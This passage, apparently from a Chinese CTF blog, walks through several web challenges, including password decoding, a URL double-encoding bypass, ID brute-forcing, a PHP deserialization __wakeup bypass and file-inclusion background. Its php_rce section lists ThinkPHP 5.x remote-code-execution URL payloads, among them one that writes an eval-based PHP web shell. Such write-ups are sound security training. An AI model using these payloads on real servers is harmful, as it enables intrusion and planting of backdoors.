punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    String<span class=\"token punctuation\">[</span><span class=\"token string\">\"fromCharCode\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 需要对比的密码</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    h <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">prompt</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Enter password'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>pass_enc**.split (**) 方法用于把一个字符串分割成字符串数组</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># ascii 转字符串</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hex_string <span class=\"token operator\">=</span> <span class=\"token string\">r\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>hex_values <span class=\"token operator\">=</span> hex_string<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">r'\\x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>hex_value<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> hex_value <span class=\"token keyword\">in</span> hex_values<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ascii_values <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">55</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">79</span><span class=\"token punctuation\">,</span><span class=\"token number\">115</span><span class=\"token punctuation\">,</span><span class=\"token number\">69</span><span class=\"token punctuation\">,</span><span class=\"token number\">114</span><span class=\"token punctuation\">,</span><span class=\"token number\">116</span><span class=\"token punctuation\">,</span><span class=\"token number\">107</span><span class=\"token punctuation\">,</span><span class=\"token number\">49</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> value <span class=\"token keyword\">in</span> ascii_values<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#55,56,54,79,115,69,114,116,107,49,50</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#786OsErtk12</span></pre></td></tr></table></figure><blockquote 786OsErtk12=\"\">\n<p>flag</p>\n</blockquote>\n<h2 id=\"baby_web\"><a class=\"markdownIt-Anchor\" href=\"#baby_web\">#</a> baby_web:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824221304273.png\" alt=\"image-20230824221304273\"></p>\n<p><img data-src=\"/img/webpic/image-20230824221335028.png\" alt=\"image-20230824221335028\"></p>\n<p>进入题目页面。初始页面一般是 index.php</p>\n<p>试着传入 index.php 试一下</p>\n<p>但是又回到 1.php</p>\n<p>用 burp 传一下试一下</p>\n<p><img data-src=\"/img/webpic/image-20230824221652725.png\" alt=\"image-20230824221652725\"></p>\n<p>成功找到 flag</p>\n<h2 id=\"php2\"><a class=\"markdownIt-Anchor\" href=\"#php2\">#</a> PHP2:&gt;</h2>\n<blockquote>\n<p>前置知识：</p>\n<p>phps 即为 PHP Source。</p>\n<p>phps 文件就是 php 的源代码文件，通常用于提供给用户（访问者）查看 php 代码，因为用户无法直接通过 Web 浏览器看到 php 文件的内容，所以需要用 phps 文件代替。其实，只要不用 php 等已经在服务器中注册过的 MIME 类型为文件即可，但为了国际通用，所以才用了 phps 文件类型</p>\n</blockquote>\n<p>这题 php 查看不了源码，只能用 phps 查看。</p>\n<p><img data-src=\"/img/webpic/image-20230824222125570.png\" alt=\"image-20230824222125570\"></p>\n<p>有点乱，用 burp 看一眼。</p>\n<p><img data-src=\"/img/webpic/image-20230824222253677.png\" alt=\"image-20230824222253677\"></p>\n<p>大概意思就是，GET 请求，如果 admin 等于传入的 id 在退出，但是下面可以通过 url 解码去绕过</p>\n<blockquote>\n<p>1, 只改变 a 即 %61dmin</p>\n<p>2, 全都改变 %61%64%6d%69%6e</p>\n</blockquote>\n<p>但是，进入网页可要 url 解码一次，所以 % 要改变 %25</p>\n<blockquote>\n<p>即最终的 payload 的为：?id=%2561%2564%256d%2569%256e</p>\n<p>​\t\t\t\t   \t\t\tor   ?id=%2561dmin</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824223440837.png\" alt=\"image-20230824223440837\"></p>\n<h2 id=\"ics-06\"><a class=\"markdownIt-Anchor\" href=\"#ics-06\">#</a> ics-06:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824223657576.png\" alt=\"image-20230824223657576\"></p>\n<p><img data-src=\"/img/webpic/image-20230824223722948.png\" alt=\"image-20230824223722948\"></p>\n<p>只有报表中心可以点</p>\n<p><img data-src=\"/img/webpic/image-20230824223808888.png\" alt=\"image-20230824223808888\"></p>\n<p>发现有 GET 传 id 的方式</p>\n<p>用 burp 抓下包看一下。（没有别的发现，只能对 id 爆破</p>\n<p><img data-src=\"/img/webpic/image-20230824224221045.png\" alt=\"image-20230824224221045\"></p>\n<p>这里添加 payload。</p>\n<p><img data-src=\"/img/webpic/image-20230824224258586.png\" alt=\"image-20230824224258586\"></p>\n<p>这样设置 payload，攻击！！</p>\n<p><img data-src=\"/img/webpic/image-20230824224459083.png\" alt=\"image-20230824224459083\"></p>\n<p>id=2333 异常。说明入侵者痕迹在这。</p>\n<p>查看响应包。</p>\n<p><img data-src=\"/img/webpic/image-20230824224825879.png\" alt=\"image-20230824224825879\"></p>\n<p>发现 flag</p>\n<h2 id=\"php_rce\"><a class=\"markdownIt-Anchor\" href=\"#php_rce\">#</a> php_rce:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824225156637.png\" alt=\"image-20230824225156637\"></p>\n<p>知识了解一下吧：</p>\n<blockquote>\n<p>1.ThinkPHP 简介：<br>\nThinkPHP 是一个开源，快速、简单的轻量级国产 PHP 开发框架，诞生于 2006 年初，原名 FCS，2007 年元旦正式更名为 ThinkPHP。使用面向对象的开发结构和 MVC 模式，融合了 Struts 的思想和 TagLib（标签库）、RoR 的 ORM 映射和 ActiveRecord 模式。</p>\n<p>ThinkPHP 可以支持 windows/Unix/Linux 等服务器环境，正式版需要 PHP 5.0 以上版本，支持 MySql、PgSQL、Sqlite 多种数据库以及 PDO 扩展，是一款跨平台，跨版本以及简单易用的 PHP 框架。</p>\n</blockquote>\n<p>其中 ThinkPHP 2 以及 ThinkPHP 3 系列已经停止维护，ThinkPHP 5 系列现使用最多，而 ThinkPHP 3 系列也积累了较多的历史用户。各个系列之间在代码实现及功能方面有较大区别。</p>\n<p>这是 PHP V5，找下 PHP V5 的漏洞。</p>\n<ul>\n<li>5.0.x：</li>\n</ul>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/think\\config/get&amp;name<span class=\"token operator\">=</span>database<span class=\"token punctuation\">.</span>username <span class=\"token comment\">// 获取配置信息</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Lang/load&amp;file<span class=\"token operator\">=</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/test<span class=\"token punctuation\">.</span>jpg <span class=\"token comment\">// 包含任意文件</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Config/load&amp;file<span class=\"token operator\">=</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/t<span class=\"token punctuation\">.</span>php <span class=\"token comment\">// 包含任意.php 文件</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>id <span class=\"token comment\">// 执行命令</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>/Index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>phpinfo&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">-1</span> <span class=\"token comment\">// 执行 phpinfo ();</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>/Index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>file_put_contents&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>shell<span class=\"token punctuation\">.</span>php&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php @eval<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span>\t<span class=\"token comment\">// 写入 shell</span></pre></td></tr></table></figure><ul>\n<li>5.1.x：</li>\n</ul>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Request/input&amp;filter<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;data<span class=\"token operator\">=</span><span class=\"token class-name\">pwd</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span></span>s<span class=\"token operator\">=</span>index/\\think\\view\\driver\\Php/display&amp;content<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name\">php</span> phpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\template\\driver\\file/write&amp;cacheFile<span class=\"token operator\">=</span>shell<span class=\"token punctuation\">.</span>php&amp;content<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php @eval<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Container/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token class-name\">id</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span></span>s<span class=\"token operator\">=</span>index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>id</pre></td></tr></table></figure><p>执行 5.0 的漏洞</p>\n<p><img data-src=\"/img/webpic/image-20230824225834486.png\" alt=\"image-20230824225834486\"></p>\n<p>发现当前目录没有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824230021454.png\" alt=\"image-20230824230021454\"></p>\n<p>根目录有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824230224897.png\" alt=\"image-20230824230224897\"></p>\n<p>得到 flag</p>\n<h2 id=\"unserialize3\"><a class=\"markdownIt-Anchor\" href=\"#unserialize3\">#</a> unserialize3:&gt;</h2>\n<p>反序列化：</p>\n<blockquote>\n<h3 id=\"什么是序列化serialize\"><a class=\"markdownIt-Anchor\" href=\"#什么是序列化serialize\">#</a> 什么是序列化 (serialize)</h3>\n<p>将对象的状态信息转换为可以存储或传输的形式的过程，简单来说，就是将状态信息保存为字符串</p>\n<h3 id=\"什么是反序列化unserialize\"><a class=\"markdownIt-Anchor\" href=\"#什么是反序列化unserialize\">#</a> 什么是反序列化 (unserialize)</h3>\n<p>将字符串转换为状态信息</p>\n<p>二、什么是反序列化漏洞</p>\n<p>当程序在进行反序列化时，会自动调用一些函数，例如_wakeup ()   _destruct () 等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。</p>\n</blockquote>\n<p>由于反序列化时 unserialize () 函数会自动调用 wakeup (),destruct (), 函数，当有一些漏洞或者恶意代码在这些函数中，当我们控制序列化的字符串时会去触发他们，从而达到攻击。</p>\n<blockquote>\n<p>__construct () : 构造函数，当创建对象时自动调用。</p>\n<p>__destruct (): 析构函数，在对象的所有引用都被删除时或者对象被显式销毁时调用，当对象被销毁时自动调用。</p>\n<p>__wakeup (): 进行 unserialize 时会查看是否有该函数，有的话有限调用。会进行初始化对象。遇到 unserialize () 时自动触发</p>\n<p>__ toString (): 当一个类被当成字符串时会被调用。</p>\n<p>__sleep (): 当一个对象被序列化时调用，可与设定序列化时保存的属性。</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xctf</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'111'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bad requests'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>code<span class=\"token operator\">=</span></pre></td></tr></table></figure><p>这个题，需要去完善下代码。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xctf</span><span class=\"token punctuation\">&#123;</span>                      <span class=\"token comment\">// 定义一个名为 xctf 的类</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'111'</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// 定义一个公有的类属性 $flag，值为 111</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>      <span class=\"token comment\">// 定义一个公有的类方法__wakeup ()，输出 bad requests 后退出当前脚本</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bad requests'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$peak</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">xctf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 使用 new 运算符来实例化该类（xctf）的对象为 peak</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$peak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 输出被序列化的对象（peak）</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>执行下</p>\n<p><img data-src=\"/img/webpic/image-20230824231257800.png\" alt=\"image-20230824231257800\"></p>\n<blockquote>\n<p s:4:flag;s:3:111;=\"\">O:4:“xctf”:1:</p>\n<p>O 代表 object（为 A 时代表 Array），4 代表 &quot;test&quot; 占 4 个字符长度，1 代表着对象具有一个变量：flag，s 代表 string，字符型（如果为 i，代表 int 型）</p>\n<p>里面的值是不可修改的，但是可以修改的属性 (变量) 数大于实际的个数时，就可以绕过 wakeup</p>\n</blockquote>\n<p>所以 payload 为</p>\n<blockquote s:4:flag;s:3:111;=\"\">\n<p>?code=O:4:“xctf”:2:</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824231621861.png\" alt=\"image-20230824231621861\"></p>\n<h2 id=\"web_php_include\"><a class=\"markdownIt-Anchor\" href=\"#web_php_include\">#</a> Web_php_include:&gt;</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 显示当前文件的源代码</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'hello'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 输出名为 'hello' 的 GET 参数的值</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 将名为 'page' 的 GET 参数的值赋给变量 $page</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 当 $page 中包含 \"php://\" 时执行循环</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 将 $page 中的所有 \"php://\" 替换为空字符串</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 包含并执行 $page 对应的文件</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><blockquote>\n<p>由于这段代码对用户输入的  <code>$page</code>  参数直接进行了  <code>include</code> ，存在安全风险。未经验证的用户输入可能导致远程文件包含（RFI）攻击或代码注入漏洞。</p>\n</blockquote>\n<blockquote>\n<p>一、文件包含漏洞分类</p>\n<p>LFI(Local File Inclusion)<br>\n 本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是 LFI。<br>\n为了方便本文把 LFI 直接称为文件包含漏洞。</p>\n<p>RFI(Remote File Inclusion)<br>\n 远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但 RFI 的利用条件较为苛刻，需要 php.ini 中进行配置</p>\n<pre><code>allow_url_fopen = On\nallow_url_include = On\n</code></pre>\n<p>两个配置选项均需要为 On，才能远程包含文件成功。<br>\n在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。</p>\n</blockquote>\n<blockquote>\n<p>二、文件包含漏洞原理</p>\n<p>本地文件包含（Local File Inclusion）漏洞，是程序员在网站设计中，为方便自己在设计构架时，使用了一些包含的函数，在文件中包含一个文件。</p>\n<p>服务器执行 PHP 文件时，可以通过文件包含函数加载另一个文件中的 PHP 代码，并且当 PHP 来执行，这会为开发者节省大量的时间。</p>\n<p>这意味着可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，只更新一个包含文件就可以了，或者当向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>\n<p>LFI 产生的原因是由于程序员未对用户可控变量进行输入检查，此漏洞的影响可能导致泄露服务器上的敏感文件等。<br>\n如若攻击者能够通过其他方式在 Web 服务器上放置代码，那么他们便可以执行任意命令</p>\n</blockquote>\n<blockquote>\n<p>三、文件包含函数</p>\n<p>PHP 中文件包含函数有以下四种：</p>\n<p>require () // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行</p>\n<p>require_once () // 如果一个文件已经被包含过，则不会在包含它</p>\n<p>include () // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行</p>\n<p>include_once () // 如果一个文件已经被包含过，则不会在包含它</p>\n<p>include 和 require 区别主要是，include 在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；<br>\n而 require 函数出现错误的时候，会直接报错并退出程序的执行。</p>\n<p>而 include_once ()，require_once () 这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>\n<p>这四个函数可以将任意类型的文件当做 PHP 文件进行解析。<br>\n示例代码：</p>\n   <?php\n       $filename  = $_GET['filename']; // 存在可控变量\n       include($filename); // 存在动态变量\n   ?>\n<p>例如：</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo stretchy=\"false\">[</mo><mtext>‘</mtext><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mtext>’</mtext><mo stretchy=\"false\">]</mo><mtext>参数开发者没有经过严格的过滤，直接带入了</mtext><mi>i</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>u</mi><mi>d</mi><mi>e</mi><mtext>的函数，攻击者可以修改</mtext></mrow><annotation encoding=\"application/x-tex\">_GET[‘filename’]参数开发者没有经过严格的过滤，直接带入了include的函数，\n攻击者可以修改\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\">[</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">’</span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">参</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">开</span><span class=\"mord cjk_fallback\">发</span><span class=\"mord cjk_fallback\">者</span><span class=\"mord 